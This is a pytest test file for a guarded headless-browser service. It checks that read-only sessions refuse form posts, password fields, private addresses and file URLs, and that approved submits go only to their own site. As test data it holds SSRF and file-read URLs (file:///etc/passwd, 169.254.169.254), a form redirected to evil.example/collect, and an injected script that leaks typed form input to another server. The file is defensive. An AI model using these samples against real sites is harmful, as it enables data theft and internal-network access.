"""The browser service against a local test site: reading, links, GET searches, new tabs; what a
read-only session refuses (form posts, scripts posting data, password fields, private addresses, file
pages); the approved submit; one job at a time. Run: pytest services/browser/tests (needs Playwright's
Chromium; PLAYWRIGHT_BROWSERS_PATH)."""
from __future__ import annotations

import asyncio
import os
import sys
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.parse import parse_qs, urlsplit

import httpx
import pytest

os.environ["BROWSER_TOKEN"] = "test-token"
os.environ["BROWSER_ALLOW_HOSTS_FOR_TESTS"] = "127.0.0.1"
os.environ.setdefault("BROWSER_CHROMIUM_SANDBOX", "0")     # tests run as root, where Chromium's sandbox can't start
sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

import app as browser_app  # noqa: E402
import guard  # noqa: E402

POSTS: list[str] = []

HOME = """<!doctype html><html><head><title>Sharma Sweets</title></head><body>
<h1>Sharma Sweets, Janakpuri</h1><p>Kaju katli Rs 1,100 per kg. Open 9 am to 10 pm.</p>
<a href="/menu">Full menu</a> <a href="/menu" target="_blank">Menu in a new tab</a>
<form action="/search" method="get" role="search"><input name="q" aria-label="Search sweets"><button>Search</button></form>
<form action="/contact" method="post"><label>Your name <input name="name"></label>
<label>Message <textarea name="message"></textarea></label><label>Password <input type="password" name="pw"></label>
<button type="submit">Send enquiry</button></form>
<button id="beacon" onclick="fetch('/beacon', {method: 'POST', body: 'x'})">Like</button>
</body></html>"""


class Site(BaseHTTPRequestHandler):
    def log_message(self, *a):  # quiet
        pass

    def _send(self, body: str, code: int = 200) -> None:
        b = body.encode()
        self.send_response(code)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(b)))
        self.end_headers()
        self.wfile.write(b)

    def do_GET(self):
        u = urlsplit(self.path)
        if u.path == "/":
            self._send(HOME)
        elif u.path == "/menu":
            self._send("<title>Menu</title><h1>Menu</h1><p>Rasgulla Rs 400 per kg</p>")
        elif u.path == "/search":
            q = parse_qs(u.query).get("q", [""])[0]
            self._send(f"<title>Search</title><p>Results for {q}: Kaju katli</p>")
        else:
            self._send("not found", 404)

    def do_POST(self):
        n = int(self.headers.get("Content-Length") or 0)
        body = self.rfile.read(n).decode()
        POSTS.append(f"{self.path} {body}")
        name = parse_qs(body).get("name", [""])[0]
        self._send(f"<title>Thanks</title><p>Thank you {name}, we will call you.</p>")


@pytest.fixture(scope="module")
def site():
    srv = ThreadingHTTPServer(("127.0.0.1", 0), Site)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    yield f"http://127.0.0.1:{srv.server_address[1]}"
    srv.shutdown()


@pytest.fixture
async def api():
    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=browser_app.app), base_url="http://b",
                                 headers={"Authorization": "Bearer test-token"}, timeout=60) as c:
        yield c
    for s in list(browser_app._sessions.values()):
        await browser_app._close(s)


def ref(page: dict, name: str) -> int:
    return next(e["ref"] for e in page["elements"] if e["name"] == name)


async def test_reads_follows_links_and_searches(api, site):
    assert (await api.post("/sessions", headers={"Authorization": "Bearer nope"})).status_code == 401
    sid = (await api.post("/sessions")).json()["id"]
    p = (await api.post(f"/sessions/{sid}/goto", json={"url": site + "/"})).json()
    assert p["title"] == "Sharma Sweets" and "Kaju katli Rs 1,100" in p["text"] and p["login_wall"] is True
    pw = next(e for e in p["elements"] if e.get("type") == "password")
    assert pw["sensitive"] is True and "value" not in pw
    search = next(e for e in p["elements"] if e["name"] == "Search sweets")
    assert search["search_form"] is True
    send = next(e for e in p["elements"] if e["name"] == "Send enquiry")
    assert send["submits"] is True and send["search_form"] is False
    # a GET search works in a read-only session
    await api.post(f"/sessions/{sid}/act", json={"action": "type", "ref": search["ref"], "text": "kaju"})
    p = (await api.post(f"/sessions/{sid}/act", json={"action": "press", "key": "Enter"})).json()
    assert "Results for kaju" in p["text"]
    p = (await api.post(f"/sessions/{sid}/act", json={"action": "back"})).json()
    p = (await api.post(f"/sessions/{sid}/act", json={"action": "click", "ref": ref(p, "Full menu")})).json()
    assert "Rasgulla" in p["text"]
    # a link that opens a new tab: the session carries on there
    p = (await api.post(f"/sessions/{sid}/goto", json={"url": site + "/"})).json()
    p = (await api.post(f"/sessions/{sid}/act", json={"action": "click", "ref": ref(p, "Menu in a new tab")})).json()
    assert p["title"] == "Menu" and any("new tab" in n for n in p["notes"])
    assert (await api.delete(f"/sessions/{sid}")).json() == {"closed": True}
    assert (await api.post(f"/sessions/{sid}/goto", json={"url": site})).status_code == 404


async def test_a_read_only_session_sends_nothing(api, site):
    POSTS.clear()
    sid = (await api.post("/sessions")).json()["id"]
    p = (await api.post(f"/sessions/{sid}/goto", json={"url": site + "/"})).json()
    await api.post(f"/sessions/{sid}/act", json={"action": "type", "ref": ref(p, "Your name"), "text": "Ravi"})
    p = (await api.post(f"/sessions/{sid}/act", json={"action": "click", "ref": ref(p, "Send enquiry")})).json()
    p = (await api.post(f"/sessions/{sid}/act", json={"action": "click", "ref": ref(p, "Like")})).json()
    await asyncio.sleep(0.3)
    assert POSTS == []
    assert any("tried to send data (POST" in b for b in p["blocked"])
    # never a password field
    pw = next(e for e in p["elements"] if e.get("type") == "password")["ref"]
    r = await api.post(f"/sessions/{sid}/act", json={"action": "type", "ref": pw, "text": "secret"})
    assert r.status_code == 422 and "never fills" in r.text
    # no file pages, no private addresses, no odd ports
    for url, word in (("file:///etc/passwd", "only http"), ("http://169.254.169.254/latest/meta-data/", "private"),
                      ("http://10.0.0.5/", "private"), ("http://localhost/", "private"),
                      ("https://example.com:8443/", "ports"), ("http://user:pw@example.com/", "password")):
        r = await api.post(f"/sessions/{sid}/goto", json={"url": url})
        assert r.status_code == 422 and word in r.text, (url, r.text)
    # one job at a time
    assert (await api.post("/sessions")).status_code == 429


async def test_an_approved_submit_sends_exactly_the_approved_form(api, site):
    POSTS.clear()
    sid = (await api.post("/sessions")).json()["id"]
    p = (await api.post(f"/sessions/{sid}/goto", json={"url": site + "/"})).json()
    by = {e["name"]: e for e in p["elements"]}
    await api.delete(f"/sessions/{sid}")
    pin = by["Send enquiry"]["form_pin"]
    assert pin["action"].endswith("/contact") and pin["method"] == "post"
    body = {"url": site + "/", "button": by["Send enquiry"]["selector"], "form": pin,
            "fields": [{"selector": by["Your name"]["selector"], "value": "Ravi"},
                       {"selector": by["Message"]["selector"], "value": "1 kg kaju katli for Sunday"}]}
    # without the form's fingerprint, or when the form now sends somewhere else, nothing is sent (S10)
    assert (await api.post("/submit", json={k: v for k, v in body.items() if k != "form"})).status_code == 409
    moved = {**body, "form": {**pin, "action": "https://evil.example/collect"}}
    assert (await api.post("/submit", json=moved)).status_code == 409 and POSTS == []
    r = await api.post("/submit", json=body)
    assert r.status_code == 200, r.text
    out = r.json()
    assert out["sent"] is True and "Thank you Ravi" in out["text"]
    assert len(POSTS) == 1 and POSTS[0].startswith("/contact name=Ravi&message=1+kg+kaju")
    assert browser_app._sessions == {}
    # a password field can't be part of a submit; a changed form sends nothing
    pw = next(e for e in p["elements"] if e.get("type") == "password")["selector"]
    r = await api.post("/submit", json={**body, "fields": [{"selector": pw, "value": "x"}]})
    assert r.status_code == 422
    r = await api.post("/submit", json={**body, "fields": [{"selector": "#gone", "value": "x"}]})
    assert r.status_code == 409 and len(POSTS) == 1


def test_guard_rules(monkeypatch):
    monkeypatch.setenv("BROWSER_ALLOW_HOSTS_FOR_TESTS", "")
    ok = ["https://www.cbic.gov.in/", "http://example.com/path?q=1", "https://93.184.215.14/"]
    for u in ok:
        assert guard.check_url(u) == u
    bad = ["ftp://x.com", "javascript:alert(1)", "http://127.0.0.1/", "http://[::1]/", "http://192.168.1.1/",
           "http://100.64.0.1/", "http://[::ffff:10.0.0.1]/", "http://0.0.0.0/", "http://printer.local/",
           "http://intranet/", "http://224.0.0.1/", "https://x.com:22/"]
    for u in bad:
        with pytest.raises(guard.Blocked):
            guard.check_url(u)


async def test_the_proxy_refuses_private_addresses(monkeypatch, site):
    monkeypatch.setenv("BROWSER_ALLOW_HOSTS_FOR_TESTS", "")
    with pytest.raises(guard.Blocked):
        await guard.resolve_public("localhost", 80)
    with pytest.raises(guard.Blocked):
        await guard.resolve_public("127.0.0.1", 80)
    p = guard.EgressProxy()
    port = await p.start()
    try:
        async with httpx.AsyncClient(proxy=f"http://127.0.0.1:{port}") as c:
            r = await c.get(site + "/")
        assert r.status_code == 403 and "Kritvia browser guard" in r.text
        assert p.blocked
    finally:
        await p.close()


async def test_a_page_cant_reach_this_server(api, site, monkeypatch):
    # a public page (here: the test site) that loads something from the browser's own loopback
    monkeypatch.setenv("BROWSER_ALLOW_HOSTS_FOR_TESTS", "127.0.0.1")
    sid = (await api.post("/sessions")).json()["id"]
    await api.post(f"/sessions/{sid}/goto", json={"url": site + "/"})
    monkeypatch.setenv("BROWSER_ALLOW_HOSTS_FOR_TESTS", "")
    s = browser_app._sessions[sid]
    status = await s.page.evaluate(f"fetch('{site}/menu').then(r => r.status).catch(() => 'refused')")
    assert status == "refused"
    p = (await api.post(f"/sessions/{sid}/act", json={"action": "scroll_down"})).json()
    assert any("private" in b or "ports" in b for b in p["blocked"])


LEAKS: list[str] = []


class Leak(BaseHTTPRequestHandler):
    def log_message(self, *a):  # quiet
        pass

    def do_GET(self):
        LEAKS.append(self.path)
        self.send_response(204)
        self.end_headers()

    do_POST = do_GET


async def test_a_submit_can_only_reach_its_own_site_while_the_form_is_filled(api, site):
    """After the approved values go in, a script sending them to another site is refused (S10)."""
    leak = ThreadingHTTPServer(("127.0.0.1", 0), Leak)
    threading.Thread(target=leak.serve_forever, daemon=True).start()
    other = f"http://127.0.0.1:{leak.server_address[1]}"
    page = (HOME.replace("</body>", f"""<script>
      document.querySelector('[name=name]').addEventListener('input', (e) =>
        fetch('{other}/leak?v=' + encodeURIComponent(e.target.value)).catch(() => 0));
      </script></body>"""))
    original = Site.do_GET

    def do_get(self):
        if urlsplit(self.path).path == "/leaky":
            self._send(page)
        else:
            original(self)
    Site.do_GET = do_get
    try:
        POSTS.clear()
        LEAKS.clear()
        sid = (await api.post("/sessions")).json()["id"]
        p = (await api.post(f"/sessions/{sid}/goto", json={"url": site + "/leaky"})).json()
        await api.delete(f"/sessions/{sid}")
        by = {e["name"]: e for e in p["elements"]}
        body = {"url": site + "/leaky", "button": by["Send enquiry"]["selector"], "form": by["Send enquiry"]["form_pin"],
                "fields": [{"selector": by["Your name"]["selector"], "value": "Ravi 9876543210"}]}
        r = await api.post("/submit", json=body)
        assert r.status_code == 200, r.text
        await asyncio.sleep(0.5)
        assert LEAKS == [] and len(POSTS) == 1            # the form went to its own site; nothing else left
        assert any("tried to reach" in b for b in r.json()["blocked"])
    finally:
        Site.do_GET = original
        leak.shutdown()


async def test_the_egress_container_is_the_only_way_out(site, monkeypatch):
    """Chained mode (S5): the browser's proxy tunnels to the egress guard, which needs its token and checks
    the address itself."""
    import base64
    import socket as _s
    with _s.socket() as sk:
        sk.bind(("127.0.0.1", 0))
        port = sk.getsockname()[1]
    monkeypatch.setenv("BROWSER_EGRESS_TOKEN", "egress-secret")
    server = asyncio.create_task(guard.serve("egress", port))
    await asyncio.sleep(0.2)
    try:
        monkeypatch.setenv("BROWSER_EGRESS", f"127.0.0.1:{port}")
        target = urlsplit(site)
        r, w = await guard.open_upstream(target.hostname, target.port)       # through the egress guard
        w.write(b"GET / HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n")
        await w.drain()
        assert b"Sharma Sweets" in await asyncio.wait_for(r.read(), 10)
        w.close()
        with pytest.raises(guard.Blocked):        # a private address is refused before it leaves the browser
            await guard.open_upstream("10.0.0.5", 443)
        # the egress guard refuses private addresses and a missing token on its own
        r, w = await asyncio.open_connection("127.0.0.1", port)
        w.write(b"CONNECT 10.0.0.5:443 HTTP/1.1\r\nProxy-Authorization: Basic "
                + base64.b64encode(b"kritvia:egress-secret") + b"\r\n\r\n")
        await w.drain()
        assert b" 403 " in await r.readuntil(b"\r\n\r\n")
        w.close()
        r, w = await asyncio.open_connection("127.0.0.1", port)
        w.write(b"CONNECT example.com:443 HTTP/1.1\r\n\r\n")
        await w.drain()
        assert b" 407 " in await r.readuntil(b"\r\n\r\n")
        w.close()
        monkeypatch.setenv("BROWSER_EGRESS_TOKEN", "wrong")
        with pytest.raises(guard.Blocked):
            await guard.open_upstream(target.hostname, target.port)
    finally:
        server.cancel()


async def test_the_relay_is_a_plain_door_to_one_address(site):
    """`guard.py relay`: the API's network reaches the browser through it, without sharing the browser's network."""
    import socket as _s
    with _s.socket() as sk:
        sk.bind(("127.0.0.1", 0))
        port = sk.getsockname()[1]
    t = urlsplit(site)
    server = asyncio.create_task(guard.serve("relay", port, (t.hostname, t.port)))
    await asyncio.sleep(0.2)
    try:
        r, w = await asyncio.open_connection("127.0.0.1", port)
        w.write(b"GET /menu HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n")
        await w.drain()
        assert b"Rasgulla" in await asyncio.wait_for(r.read(), 10)
        w.close()
    finally:
        server.cancel()
